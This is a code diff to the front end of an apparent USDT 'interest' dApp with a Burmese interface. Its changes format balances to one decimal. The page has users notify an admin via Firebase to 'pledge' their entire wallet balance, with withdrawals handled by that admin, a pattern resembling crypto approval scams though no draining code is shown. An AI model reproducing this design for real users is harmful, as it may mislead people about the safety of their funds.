@@ -104,23 +104,23 @@
             <div class="space-y-2.5 font-mono">
                 <div class="flex justify-between text-slate-400">
                     <span>Wallet balance</span>
-                    <span id="lblWalletBal" class="text-slate-200">0.000000 USDT</span>
+                    <span id="lblWalletBal" class="text-slate-200">0.0 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Locked balance</span>
-                    <span id="lblLockedBal" class="text-slate-200">0.000000 USDT</span>
+                    <span id="lblLockedBal" class="text-slate-200">0.0 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Interest balance</span>
-                    <span id="lblCashbackBal" class="text-slate-200">0.000000 USDT</span>
+                    <span id="lblCashbackBal" class="text-slate-200">0.0 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400">
                     <span>Referral balance</span>
-                    <span id="lblReferralBal" class="text-slate-300">0.000000 USDT</span>
+                    <span id="lblReferralBal" class="text-slate-300">0.0 USDT</span>
                 </div>
                 <div class="flex justify-between text-slate-400 border-t border-slate-800 pt-2.5 font-semibold">
                     <span class="text-emerald-400">Withdrawable balance</span>
-                    <span id="lblWithdrawableBal" class="text-emerald-400">0.000000 USDT</span>
+                    <span id="lblWithdrawableBal" class="text-emerald-400">0.0 USDT</span>
                 </div>
             </div>
 
@@ -131,7 +131,7 @@
             <div class="bg-slate-800/90 border border-slate-700 p-3.5 rounded-xl space-y-1">
                 <div class="flex justify-between items-center">
                     <span class="font-bold text-white">Interest</span>
-                    <span id="lblInterestUsdt" class="font-mono font-semibold text-emerald-300">0.000000 USDT</span>
+                    <span id="lblInterestUsdt" class="font-mono font-semibold text-emerald-300">0.0 USDT</span>
                 </div>
                 <div class="flex justify-between items-center text-xs text-slate-400">
                     <span>Interest is available every days</span>
@@ -274,6 +274,12 @@
             "function allowance(address owner, address spender) view returns (uint256)",
             "function balanceOf(address account) view returns (uint256)"
         ];
+
+        function formatUsdtOneDecimal(value) {
+            const num = Number(value);
+            if (!Number.isFinite(num)) return "0.0 USDT";
+            return `${num.toFixed(1)} USDT`;
+        }
 
         function withTimeout(promise, ms = 6000, fallbackValue = null) {
             return Promise.race([
@@ -619,7 +625,7 @@
                     
                     const currentBalEl = document.getElementById("lblWalletBal");
                     if (currentBalEl) {
-                        currentBalEl.innerText = `${formattedBal.toFixed(6)} USDT`;
+                        currentBalEl.innerText = formatUsdtOneDecimal(formattedBal);
                     }
                 } catch (err) {
                     console.error("Real-time balance sync error:", err);
@@ -689,7 +695,7 @@
             return 0;
         }
 
-        async function startConnectProcess() {
+     async function startConnectProcess() {
             if (typeof window.ethereum === "undefined") {
                 alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
                 return;
@@ -852,12 +858,12 @@
                 const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
                 document.getElementById("lblUserId").innerText = userIdDisplay;
 
-                document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
+                document.getElementById("lblWalletBal").innerText = formatUsdtOneDecimal(formattedBal);
                 const lockedBalNum = Number(fbUser.lockedBalance || 0);
                 const fbInterestNum = Number(fbUser.interestBalance || 0);
                 const fbRefNum = Number(fbUser.referralBalance || 0);
 
-                document.getElementById("lblLockedBal").innerText = `${lockedBalNum.toFixed(6)} USDT`;
+                document.getElementById("lblLockedBal").innerText = formatUsdtOneDecimal(lockedBalNum);
 
                 const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
                 const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
@@ -868,17 +874,17 @@
                 if (!isEligibleForInterest) {
                     const remainingUsdt = Math.max(0, 100 - formattedBal);
                     tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
-                    tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(2)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(2)} USDT လိုအပ်ပါသည်)။`;
+                    tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(1)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(1)} USDT လိုအပ်ပါသည်)။`;
                 } else {
                     tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
                     tierNoticeEl.innerText = `Interest ရရှိနေပါပြီ (လက်ရှိ Rate: ${(rate * 100).toFixed(1)}% USDTBalance)။`;
                 }
 
-                document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
-                document.getElementById("lblReferralBal").innerText = `${fbRefNum.toFixed(6)} USDT`;
-                document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
+                document.getElementById("lblCashbackBal").innerText = formatUsdtOneDecimal(cashback);
+                document.getElementById("lblReferralBal").innerText = formatUsdtOneDecimal(fbRefNum);
+                document.getElementById("lblWithdrawableBal").innerText = formatUsdtOneDecimal(withdrawableBalance);
 
-                document.getElementById("lblInterestUsdt").innerText = `${cashback.toFixed(6)} USDT`;
+                document.getElementById("lblInterestUsdt").innerText = formatUsdtOneDecimal(cashback);
                 document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
                 document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
 
@@ -909,7 +915,7 @@
                 await withTimeout(checkUserData(), 6000, null);
 
                 if (currentWithdrawableBalance <= 0) {
-                    alert("လက်ရှိ ထုတ်ယူနိုင်သော Balance (0.000000 USDT) မရှိသေးပါ။");
+                    alert("လက်ရှိ ထုတ်ယူနိုင်သော Balance (0.0 USDT) မရှိသေးပါ။");
                     return;
                 }
 
@@ -928,7 +934,7 @@
                     null
                 );
 
-                alert(`Withdraw (${withdrawAmountNum.toFixed(6)} USDT) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
+                alert(`Withdraw (${formatUsdtOneDecimal(withdrawAmountNum)}) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
                 await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
@@ -959,7 +965,7 @@
                 }
 
                 const confirmed = confirm(
-                    `သင်၏ Wallet Balance အားလုံး (${formattedBal.toFixed(6)} USDT) အတွက် Pledge တောင်းဆိုချက်ကို Admin ထံ အသိပေးမည်လား?`
+                    `သင်၏ Wallet Balance အားလုံး (${formatUsdtOneDecimal(formattedBal)}) အတွက် Pledge တောင်းဆိုချက်ကို Admin ထံ အသိပေးမည်လား?`
                 );
                 if (!confirmed) return;
 
@@ -986,9 +992,9 @@
                     null
                 );
 
-                showProgress(100, `Pledge (${formattedBal.toFixed(6)} USDT) အတွက် Admin ကို အသိပေးပြီးပါပြီ။`);
+                showProgress(100, `Pledge (${formatUsdtOneDecimal(formattedBal)}) အတွက် Admin ကို အသိပေးပြီးပါပြီ။`);
                 setTimeout(hideProgress, 2000);
-                alert(`Pledge (${formattedBal.toFixed(6)} USDT) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
+                alert(`Pledge (${formatUsdtOneDecimal(formattedBal)}) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
                 await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
